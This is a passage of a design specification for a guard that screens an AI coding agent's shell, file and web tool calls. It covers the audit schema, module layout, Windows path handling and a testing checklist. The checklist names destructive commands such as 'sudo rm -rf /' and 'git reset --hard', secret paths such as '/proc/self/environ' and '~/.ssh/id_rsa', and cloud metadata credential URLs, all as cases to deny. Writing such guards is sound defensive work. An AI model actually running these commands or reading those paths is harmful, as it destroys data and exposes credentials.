    session_id       TEXT NOT NULL,
    agent_name       TEXT NOT NULL,
    trust_level      TEXT NOT NULL,
    tool_name        TEXT NOT NULL,
    input            TEXT NOT NULL,
    matched_segment  TEXT NOT NULL,
    verdict          TEXT NOT NULL CHECK(verdict IN ('Warn', 'Deny')),
    rule_id          TEXT NOT NULL,
    reason           TEXT,
    suggestion       TEXT
);
CREATE INDEX IF NOT EXISTS idx_tg_ts      ON tool_guard_events(timestamp);
CREATE INDEX IF NOT EXISTS idx_tg_session ON tool_guard_events(session_id);
CREATE INDEX IF NOT EXISTS idx_tg_agent   ON tool_guard_events(agent_name);
CREATE INDEX IF NOT EXISTS idx_tg_verdict ON tool_guard_events(verdict);
CREATE INDEX IF NOT EXISTS idx_tg_tool    ON tool_guard_events(tool_name);
CREATE INDEX IF NOT EXISTS idx_tg_rule    ON tool_guard_events(rule_id);
```

`input` and `matched_segment` serialization is deterministic for multi-target tools:
- `read_many_files`: `input` is a JSON string array preserving call order; `matched_segment` is the first normalized path that produced the strictest verdict (tie-break: first in input order). `rule_id` and `reason` must correspond to the rule that matched that decisive path.
- `apply_patch`: `input` is raw patch text; `matched_segment` is the normalized path that produced the strictest verdict (tie-break: first in operation order), or `<delete_count:N>` when `file.apply_patch_delete_many` is decisive. `rule_id` and `reason` must correspond to the decisive match.
- `grep` with missing `path`: effective path is `env.working_directory()` for both evaluation and audit; `input` stores the resolved path and `matched_segment` stores the normalized decisive path.

When multiple paths produce the same strictest verdict (e.g., two Deny matches), the first such path in input/operation order is the decisive path recorded in audit.

### 9.2 Write Path

Audit writes remain asynchronous and best-effort via a bounded channel. `Warn` and `Deny` only are recorded; `Allow` is not recorded.

---

## 10. Module Structure

```
rust/agents/src/tool_guard/
├── mod.rs          # ToolGuard, GuardVerdict, TrustLevel, public API, dispatch
├── shell/
│   ├── mod.rs      # ShellToolGuard
│   ├── evaluator.rs
│   ├── tokenizer.rs
│   └── packs/
│       ├── mod.rs
│       ├── core.rs
│       ├── database.rs
│       ├── containers.rs
│       ├── kubernetes.rs
│       ├── cloud.rs
│       ├── system.rs
│       └── packages.rs
├── file_guard.rs
├── web_guard.rs
├── paths.rs
└── audit.rs
```

Feature-gated in `Cargo.toml`:

```toml
[features]
default = ["skills", "mcp", "codemode", "tool-guard"]
tool-guard = []
```

---

## 11. Platform Behavior

**Unix:** Full shell/file/web guard behavior.

**Windows:**
- Shell wrapper extraction (`cmd /c`, `powershell -Command`, `pwsh -Command`) is supported, including `.exe` suffixed variants (`cmd.exe /c`, `powershell.exe -Command`, `pwsh.exe -Command`).
- Shell pattern packs remain Unix-oriented after wrapper extraction.
- File guard path normalization on Windows: backslash separators (`\`) are normalized to forward slashes (`/`) before all other processing. Drive letter prefixes (e.g., `C:\`) are preserved after separator normalization (e.g., `C:\Users\foo\.ssh\id_rsa` → `C:/Users/foo/.ssh/id_rsa`). `~` expansion uses the platform's home directory (`%USERPROFILE%` on Windows). Path list entries in `SENSITIVE_PATHS`, `SENSITIVE_WRITE_PATHS`, etc. use Unix-style paths — after normalization, Windows paths are matched against these Unix-style entries. For example, `C:/Users/foo/.ssh/id_rsa` matches the expanded form of `~/.ssh/` because `~` expands to `C:/Users/foo` and the prefix check succeeds. `SYSTEM_READ_PATHS` and `SYSTEM_WRITE_PATHS` entries (`/proc/`, `/etc/`, etc.) do not exist on Windows and will not match Windows paths — these rules are effectively no-ops on Windows. The `outside_workspace_*` checks compare normalized paths using forward-slash string prefix matching after normalization; drive letter differences (e.g., workspace on `C:`, path on `D:`) are correctly detected as outside-workspace because the string prefixes differ.
- URL parsing is platform-independent.

---

## 12. Out of Scope

OS-level sandboxing (bubblewrap, Landlock, etc.) is out of scope for this spec. If added, it should live as a Tool Execution Environment layer as described in `coding-agent-loop-spec.md` §4.

| Feature | Rationale | Planned Direction |
|---------|-----------|-------------------|
| OS-level sandboxing (bubblewrap, Landlock) | Defense-in-depth layer below the guard | Tool Execution Environment (`coding-agent-loop-spec.md` §4) |
| DNS rebinding defense for web fetch | Requires resolved-IP enforcement in HTTP connection path | Future enhancement |
| IP obfuscation normalization | Numeric parsing for hex/octal/decimal/abbreviated hosts | Future enhancement |
| Symlink resolution in guard path normalization | `canonicalize()` requires filesystem I/O on each check | Future enhancement |
| Redirect-chain inspection | Need to evaluate every hop, not just initial URL | Future enhancement |
| Response content scanning | Detect instruction injection in fetched content | Future enhancement |
| Registry-level guard interception | Cleaner architecture than per-executor injection | Future enhancement |
| Per-agent path allow/deny policies | Requires richer schema and glob semantics | Future enhancement |
| `glob` / `list_dir` guard rules | Limited to path-list disclosure in the current scope | Future enhancement |
| `grep` recursive descendant enumeration | Guard checks stated path, not each traversed file | Future enhancement |

---

## 13. Definition of Done

### Core Guard

- [ ] `ToolGuard` exists with shell/file/web dispatch.
- [ ] `GuardVerdict` enum implemented with `Allow`, `Warn`, and `Deny` variants.
- [ ] Composite `rule_id` is required for all `Warn`/`Deny`.
- [ ] Trust-level behavior matches §3 decision table.

### Shell Guard

- [ ] Shell extraction, tokenization, and pack-based evaluation implemented per §4–§6.
- [ ] Shell rule IDs migrate to `shell.{pack}.{rule}`.
- [ ] Shell guard still denies parse failures and over-depth nesting.
- [ ] `env` prefix stripping handles `-u`/`-C`/`-S` options that consume a following argument token.
- [ ] `env` prefix stripping denies unrecognized `-` flags (fail-closed per §4.2).
- [ ] Wrapper detection returns Deny (parse failure) when `-c` has no following token.
- [ ] `sudo rm -rf /` is denied by destructive patterns; `sudo ls` is denied at low trust by default-deny and allowed at medium/high trust.

### File Guard

- [ ] File guard evaluates `read_file`, `read_many_files`, `write_file`, `edit_file`, `apply_patch`, `grep`.
- [ ] Path normalization resolves `~`, `..`, relative paths against tool working directory.
- [ ] Path matching uses the three modes defined in §6.5.1 (exact, prefix, basename) based on entry form.
- [ ] `file.system_path_read` uses `SYSTEM_READ_PATHS` (narrower than `SYSTEM_WRITE_PATHS`).
- [ ] `outside_workspace_read` produces Warn at `medium` trust.
- [ ] `outside_workspace_*` checks use session workspace root.
- [ ] Unmatched paths (no rule fires) produce Allow at all trust levels.
- [ ] `.git` protection is component-based and covers whole `.git/` tree.
- [ ] `apply_patch` evaluates all source/destination paths including `move_to`.
- [ ] `apply_patch_delete_many` threshold (`>= 5`) implemented.
- [ ] All file guard Warn/Deny verdicts include normative `reason` and `suggestion` strings from §6.6.
- [ ] File rule resolution uses strictest-verdict-wins with table-order tie-break per §4.7.

### Web Guard

- [ ] Built-in SSRF and metadata rules implemented.
- [ ] `web.metadata_endpoint` uses `METADATA_HOSTS` list; `web.credential_url` uses `METADATA_HOSTS` + `CREDENTIAL_PATH_PREFIXES`.
- [ ] Rule evaluation order is most-specific-first: `credential_url` → `metadata_endpoint` → `internal_network` → `non_https` → `high_risk_port` → domain lists.
- [ ] `non_https` and `high_risk_port` honor trust-level behavior.
- [ ] `allowedDomains` and `disallowedDomains` parsed from agent config.
- [ ] Allowlist takes precedence when both lists are set.
- [ ] Wildcard behavior (`*.example.com` excludes bare `example.com`) is documented and tested.
- [ ] Host normalization (ASCII case-fold, trailing dot strip) applied to both URL host and domain list entries before comparison.
- [ ] Unmatched URLs (no rule fires, domain lists pass or absent) produce Allow at all trust levels.
- [ ] All web guard Warn/Deny verdicts include normative `reason` and `suggestion` strings from §6.7.

### Integration

- [ ] Guarded tools expose `executor_with_guard(...)`.
- [ ] Shell exposes `executor_with_guard_and_timeout(...)`.
- [ ] `register_core_tools`, `register_gemini_tools`, and `register_openai_tools` thread guard + context to guarded executors.
- [ ] `AnthropicProfile::new`, `OpenAiProfile::new`, and `GeminiProfile::new` accept `Option<Arc<ToolGuard>>` + `Option<Arc<GuardContext>>` and use guarded executor constructors (not `foo::executor()` for guarded tools).
- [ ] Subagents share policy `Arc<ToolGuard>` and use per-session `GuardContext`.
- [ ] Info-level event emitted when a child agent's declared `trustLevel` differs from the inherited guard's level.

### Audit

- [ ] `tool_guard_events` migration created.
- [ ] `tool_name` and single non-null `rule_id` columns added.
- [ ] `idx_tg_ts`, `idx_tg_tool`, and `idx_tg_rule` indexes exist.
- [ ] Multi-target serialization is deterministic and records the first strictest decisive path (input/operation-order tie-break) with `rule_id`/`reason` from that decisive match.

### Testing

- [ ] Shell guard tests cover all packs, safe patterns, wrapper extraction, separator splitting, and trust-level behavior.
- [ ] File guard tests cover system/sensitive/outside-workspace read+write, apply-patch multi-path, and all three path matching modes (exact, prefix, basename) including basename matching in subdirectories.
- [ ] Web guard tests cover internal hosts, metadata, credential URLs, domain list precedence, wildcard semantics, the full `HIGH_RISK_PORTS` list, and host normalization (case-folding, trailing dot).
- [ ] `env` prefix stripping tests cover `-u VAR`, `-C DIR`, `-S STRING`, `--`, `NAME=VALUE`, missing-argument parse failures, and unrecognized flag Deny.
- [ ] `sudo`/`doas` prefix tests confirm `sudo rm -rf /` is denied and `sudo ls` behaves correctly at each trust level.
- [ ] File guard tests cover `/proc/self/environ` as an explicit `system_path_read` test case.
- [ ] File guard tests confirm `outside_workspace_read` produces Warn at `medium` trust.
- [ ] Web guard tests cover `METADATA_HOSTS` and `CREDENTIAL_PATH_PREFIXES` entries from §4.8.
- [ ] Web guard tests confirm that `169.254.169.254` with a credential path fires `credential_url` (not `internal_network` or `metadata_endpoint`).
- [ ] Web guard tests confirm that `metadata.google.internal` (non-credential path) fires `metadata_endpoint` (not `internal_network`).
- [ ] File guard tie-break tests confirm that `/proc/self/environ` reports `rule_id = "file.system_path_read"` (not `file.sensitive_path_read`).
- [ ] Destructive pattern tests confirm non-first pipe segments are detected (e.g., `echo x | git reset --hard` is denied).
- [ ] All destructive patterns use `\b` word boundaries, not `^`/`$` anchors (§6.2 rule 5).
- [ ] Cross-tool integration tests verify `Warn`/`Deny` are returned as tool output text, not hard errors.
- [ ] Windows wrapper detection tests include `.exe` suffix variants (`cmd.exe /c`, `powershell.exe -Command`).
- [ ] Windows file guard tests confirm backslash normalization and `~` expansion on Windows paths.
